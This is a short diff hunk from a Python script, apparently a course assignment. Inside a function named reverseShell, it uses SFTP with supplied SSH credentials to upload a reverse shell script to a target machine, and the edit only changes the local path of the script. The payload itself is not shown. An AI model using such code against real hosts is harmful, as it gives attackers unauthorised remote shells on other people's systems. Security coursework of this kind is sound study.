@@ -127,7 +127,7 @@ def reverseShell(sshClient, target_ip_addr, username, pswd):
 		ScriptTransfer.connect(username=username, password=pswd)
 		#uploading the reverse shell script to the target
 		sftp = SFTPClient.from_transport(ScriptTransfer)
-		sftp.put("/home/samiphegde/Assignment2/shell.py" , f"/home/{username}/shell.py")
+		sftp.put("/shell.py" , f"/home/{username}/shell.py")
 		print(f"Reverse shell uploaded on {target_ip_addr} and executed.")
 		sftp.close()
 		ScriptTransfer.close()
